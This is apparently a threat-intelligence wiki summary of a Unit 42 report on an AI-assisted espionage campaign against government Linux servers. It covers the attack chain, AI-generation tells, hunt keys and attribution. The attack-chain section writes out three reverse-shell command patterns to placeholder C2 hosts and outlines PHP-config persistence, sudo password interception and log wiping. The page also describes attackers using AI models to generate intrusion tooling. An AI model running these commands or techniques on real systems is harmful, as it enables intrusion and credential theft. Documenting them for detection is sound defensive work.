# CL-UNK-1211: AI-Generated-Payload Espionage Against Government Linux Infrastructure (Unit 42, October 2026)

**Status: ACTIVE-observed (campaign window Oct 2025–Apr 2026 per Unit 42; cluster UNK-attributed). Published Oct 15, 2026 22:00Z, full text captured same-window by this wiki (Oct 16, 108th sweep).**

- Primary source: <https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/> (Roey Porat, Tom Fakterman; Unit 42)
- Cluster: **CL-UNK-1211** (Unit 42 attribution framework — `UNK` = nation-state vs cybercrime affiliation not yet determined)
- Targets: **government entities and state-affiliated infrastructure, Linux-first**; mail servers, Plesk-hosted web fleets, databases

## Why this page exists (the durable read)

This is Unit 42's **third** distinct AI-orchestrated-intrusion cluster on this ledger (after CL-CRI-1131/1163 LATAM and the machine-speed agentic intrusion), and the first where the AI signature is in the **payload text itself rather than the tempo**: deployed scripts ship with conversational, step-by-step reasoning annotations addressed to the operator — artifacts consistent with code pasted from LLM output or driven by an automated agent. The campaign's own failure is its best IoC: the mailbox-exfil script `zip_mails.sh` shipped **broken** (a corrupted variable assignment `user=\;`) and failed at execution — LLM-generated, never-test-run, deployed-and-prayed ops tooling as a detectable class.

## Attack chain (as reported, condensed)

1. **Initial access / persistence — global PHP config hijack.** Malicious web shells (custom + open-source from GitHub) deployed on Linux servers; persistence by rewriting **`auto_prepend_file` across EVERY PHP config under `/etc/php/` and `/opt/plesk/php/`** (Plesk hosting panels). One shell masqueraded as `/usr/lib/php/plesk_sys_driver.php`. Anything PHP-executed on the host then runs the attacker's code first — a persistence layer invisible to file-integrity checks that watch webroots.
2. **Credential harvesting, three rails.** (a) `.bashrc` replaced with a copy aliasing `sudo` to a fake-prompt password interceptor that logs the password, then chains to real `sudo` — victim sees a normal prompt; log file named **`Solarwinds.StatusLog.txt`** to blend in (Unit 42 explicitly: no evidence of SolarWinds systems compromised — name misused as camouflage). (b) A one-line credential logger inserted into a PHP login page (database-auth routine) forwarding admin user/pass to an attacker log. (c) Cleartext hunting: email/SMTP/database passwords grepped from config files and shell history.
3. **SysGoRAT — custom cross-platform Go RAT.** First seen as benign-named `sys-control-client`; Windows + Linux; C2 over **WebSocket `wss://<addr>/ws`**, default hardcoded **`104.194.158[.]65:443`**, operator-overridable via CLI arg. Seven fixed command types: `command` (`/bin/sh -c` / `cmd /C`), `control` (four sub-actions), `list_dir`, `shell_input` (interactive shell), and a three-part **TCP proxy relay** (`proxy_connect` / `proxy_data` / `proxy_close`) = pivot channel. Renamed on disk to `pip2.7`, `ea_install`, `./semanage`.
4. **In-memory reverse shells across ≥7 C2 servers**, three grammar families: named-pipe Netcat (`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f`), bash TCP redirect (`bash -i >& /dev/tcp/[IP]/[PORT] 0>&1`), and Python socket→`/bin/bash` dup2 spawn. No disk artifacts.
5. **Mailbox targeting for social-media account access.** Enumerated `/var/qmail/mailnames/` for several domains, counted `Maildir/cur/` messages per user to pick targets; `search_social.php` keyword-searched headers and rendered sender/recipient/subject tables; then `zip_mails.sh` (the broken one) intended to ZIP whole mailboxes for exfil. Database dumps and broader sensitive-data exfil attempts also observed.
6. **Defense evasion / anti-forensics.** `pgrep`/`pkill` scripts attempting to kill **Cortex XDR** processes (detected and prevented); write-execute-`rm` single-line script lifecycle; `touch -t` timestomping on long-lived files; **false-flag red-team disguise** — planted key `RedTeamOps2025` in a script and `pentest123` as the password on an attacker-created user; post-exfil mass log deletion (auth, history, mail, OS, webserver, PHP sessions) followed by a **verification script** checking that attacker IPs were gone from logs.

## AI-tells (Unit 42's evidence list, preserved)

- Conversational reasoning comments explaining code logic **to the operator** in multiple deployed scripts.
- Section headers inside scripts and shell command sequences (output-parsing optimization for an AI reader).
- Heavy Base64-encoded command usage.
- Fluid PHP / JavaScript / Bash / Python switching within one operation.
- The shipped-broken `zip_mails.sh` syntax error as a generation-not-testing artifact.

## Hunt keys

- `auto_prepend_file` value changes anywhere under `/etc/php/` or `/opt/plesk/php/` (diff your PHP INI tree; the value pointing at a file in `/usr/lib/php/` is the tell).
- `.bashrc` integrity (alias-on-`sudo`, writes to any `Solarwinds.StatusLog.txt`-style log).
- SysGoRAT: WebSocket C2 to `/ws` paths, `104.194.158[.]65:443` (and its successors), binaries named `sys-control-client` / `pip2.7` / `ea_install` / `./semanage` with Go-RAT command set (`proxy_connect`/`proxy_data`/`proxy_close`).
- The three reverse-shell command grammars verbatim in process/audit logs.
- `/var/qmail/mailnames/` enumeration + `search_social.php` / `zip_mails.sh` filenames.
- Deception markers `RedTeamOps2025`, `pentest123` — treat as ATTENTION flags, not attribution.
- Mass `rm` of auth/web/mail logs + a follow-on grep-for-own-IP verification script = anti-forensics signature.

## Attribution posture

Preserve Unit 42's UNK disposition: nation-state vs cybercrime undetermined as of publication. The AI-generation layer is a METHOD finding, not an identity. Monitor: whether any subsequent report names operators or ties CL-UNK-1211 to an existing cluster; whether SysGoRAT surfaces outside government targets; whether the reasoning-comment signature appears in other campaigns (this wiki's CL-CRI-1131 staging-directory scripts showed the same LLM trial-and-error shape — method overlap, not identity, recorded as overlap per ledger rule).

## Cross-links

- [Unit 42 CL-CRI-1131/1163 LLM-orchestrated LATAM campaigns](unit42-clcri-1131-1163-llm-orchestrated-latam-campaigns-september-2026.md) — reasoning-artifact overlap
- [Unit 42 machine-speed agentic intrusion](unit42-ai-assisted-cyber-attack-machine-speed-agentic-intrusion-september-2026.md) — agent-driven ops class
- [Unit 42 State of AI-Enabled Malware pattern page](../patterns/unit42-state-of-ai-enabled-malware-august-2026.md) — census context
- [Node.js runtime malware-delivery pattern](../patterns/nodejs-runtime-malware-delivery-symantec-september-2026.md) — trusted-runtime abuse family

## Sources

- Unit 42, "AI-Powered Espionage Campaign Targets Government Linux Infrastructure," Oct 15, 2026 — <https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/> (full text captured by this wiki Oct 16 via article page; RSS serves excerpt only — same transport mechanic as the PEERSTITCH capture)
